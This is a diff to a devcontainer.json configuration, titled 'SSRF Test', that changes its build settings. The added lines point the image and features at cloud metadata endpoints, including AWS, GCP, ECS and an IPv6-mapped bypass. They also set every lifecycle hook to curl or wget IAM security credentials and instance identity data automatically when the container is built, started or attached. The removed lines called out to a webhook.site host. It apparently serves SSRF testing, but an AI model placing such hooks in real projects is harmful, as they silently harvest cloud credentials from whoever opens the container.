@@ -1,11 +1,16 @@
 {
-  "name": "SSRF Test",
-  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "name": "SSRF Test 2026",
+  "image": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
   "features": {
-    "ghcr.io/devcontainers/features/common-utils:2": {},
-    "http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/feature.tgz": {
-      "version": "latest"
-    }
+    "http://169.254.169.254/latest/meta-data/": {},
+    "http://169.254.169.254/latest/user-data": {},
+    "http://metadata.google.internal/computeMetadata/v1/": {},
+    "http://169.254.170.2/v2/credentials": {},
+    "http://[::ffff:169.254.169.254]/latest/meta-data/": {}
   },
-  "postCreateCommand": "curl http://webhook.site/2cf5eb66-496a-48e0-b751-f906e7ae6401/devcontainer-postcreate"
+  "initializeCommand": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ > /tmp/imds_init.txt || true",
+  "onCreateCommand": "curl -s http://169.254.169.254/latest/meta-data/ > /tmp/imds_oncreate.txt || true",
+  "postCreateCommand": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ && curl -s http://169.254.170.2/v2/credentials",
+  "postStartCommand": "wget -q -O- http://169.254.169.254/latest/meta-data/",
+  "postAttachCommand": "curl http://169.254.169.254/latest/dynamic/instance-identity/document"
 }
